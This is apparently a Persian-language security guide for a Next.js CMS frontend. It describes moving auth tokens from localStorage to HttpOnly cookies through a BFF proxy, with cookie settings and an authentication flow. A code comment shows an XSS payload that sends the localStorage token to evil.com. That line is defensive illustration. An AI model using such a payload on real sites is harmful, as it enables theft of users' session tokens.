# راهنمای امنیت - HttpOnly Cookie Authentication

## معماری امنیتی

```
┌──────────┐         ┌─────────────────┐         ┌──────────────┐
│  Browser │ ──────► │ Next.js BFF     │ ──────► │ Backend API  │
│  (React) │ Cookie  │ (Proxy routes)  │ Header  │ (port 4000)  │
└──────────┘         └─────────────────┘         └──────────────┘
   JavaScript         Server-side code          Trusted zone
   CANNOT access      Reads cookie              Validates token
   the token          Adds as Auth header
```

## تغییرات کلیدی

### ❌ قبل (ناامن)
```javascript
// localStorage - قابل دسترسی توسط JavaScript
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
localStorage.setItem('user', JSON.stringify(userData));

// هر XSS می‌تواند توکن را بدزدد:
// <script>fetch('https://evil.com?t='+localStorage.getItem('token'))</script>
```

### ✅ بعد (امن)
```javascript
// HttpOnly Cookie - JavaScript نمی‌تواند بخواند
Set-Cookie: cms-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Lax

// حتی اگر XSS رخ دهد، توکن محافظت می‌شود:
// <script>document.cookie</script> → cms-user=... (بدون توکن!)
```

## مسیرهای API ایجاد شده

| مسیر | متد | توضیح |
|------|-----|-------|
| `/api/auth/login` | POST | ورود - توکن را در HttpOnly cookie ذخیره می‌کند |
| `/api/auth/logout` | POST | خروج - cookie را پاک می‌کند |
| `/api/auth/me` | GET | اطلاعات کاربر فعلی (اعتبارسنجی توکن) |
| `/api/proxy/[...path]` | همه | پروکسی عمومی - اضافه کردن خودکار `Authorization` header |

## تنظیمات Cookie

```typescript
const COOKIE_OPTIONS = {
  httpOnly: true,                        // ❌ JavaScript نمی‌تواند بخواند
  secure: process.env.NODE_ENV === 'production', // 🔒 فقط HTTPS در production
  sameSite: 'lax',                        // 🛡️ محافظت CSRF
  path: '/',
  maxAge: 60 * 60 * 24 * 7,             // 7 روز
};
```

## متغیرهای محیطی

```bash
# .env.local
CMS_API_URL=http://localhost:4000           # URL بک‌اند (فقط سرور)
NEXT_PUBLIC_CMS_API=http://localhost:4000   # اختیاری - برای فایل‌های رسانه
CMS_VALIDATE_TOKEN=false                    # اختیاری - غیرفعال کردن اعتبارسنجی توکن
```

## مزایای BFF Pattern

### 1. محافظت در برابر XSS
```javascript
// مهاجم نمی‌تواند به توکن دسترسی داشته باشد حتی با XSS
// document.cookie فقط user info را نشان می‌دهد (non-httpOnly)
```

### 2. مخفی کردن URL بک‌اند
```javascript
// قبل: کاربر می‌توانست بفهمد بک‌اند کجاست
// بعد: فقط /api/proxy/* دیده می‌شود
```

### 3. کش و Rate Limiting
```javascript
// می‌توان در سطح Next.js rate limiting اضافه کرد
// می‌توان پاسخ‌ها را cache کرد
```

### 4. محافظت در برابر CSRF
```javascript
// SameSite=Lax از ارسال cookie با درخواست‌های cross-site جلوگیری می‌کند
```

## جریان کامل احراز هویت

```
1. کاربر → POST /api/auth/login { email, password }
2. Next.js → POST http://backend/v1/auth/login
3. بک‌اند → { token, user }
4. Next.js → Set-Cookie: cms-auth-token=<token>; HttpOnly
5. Next.js → 200 OK { user }
6. کاربر → GET /api/proxy/v1/posts (با cookie)
7. Next.js → GET http://backend/v1/posts (با Authorization: Bearer <token>)
8. بک‌اند → 200 OK { items, total }
9. Next.js → 200 OK { items, total }
```

## مهاجرت از نسخه قبلی

اگر قبلاً توکن در localStorage داشتید، کافیست:
1. یک‌بار خارج شوید (logout)
2. دوباره وارد شوید (login)
3. توکن جدید در HttpOnly cookie ذخیره می‌شود

## بررسی‌های امنیتی

```bash
# 1. بررسی اینکه توکن در localStorage نیست
localStorage.getItem('cms-auth-token') // → null

# 2. بررسی اینکه توکن در document.cookie نیست
document.cookie.split(';').some(c => c.includes('cms-auth-token')) // → false

# 3. بررسی اینکه cookie با HttpOnly تنظیم شده
# DevTools → Application → Cookies → cms-auth-token → HttpOnly: ✓
```

## محدودیت‌ها

1. **Backend باید Bearer Token پشتیبانی کند** - این قبلاً پشتیبانی می‌شد
2. **CORS** - اگر بک‌اند CORS strict دارد، باید `/api/*` را allow کند
3. **Timeout** - اگر کاربر 7 روز فعالیت نکند، باید دوباره login کند

## لاگ تغییرات

| تاریخ | تغییر |
|-------|--------|
| 2025-06 | افزودن HttpOnly Cookie authentication با الگوی BFF |
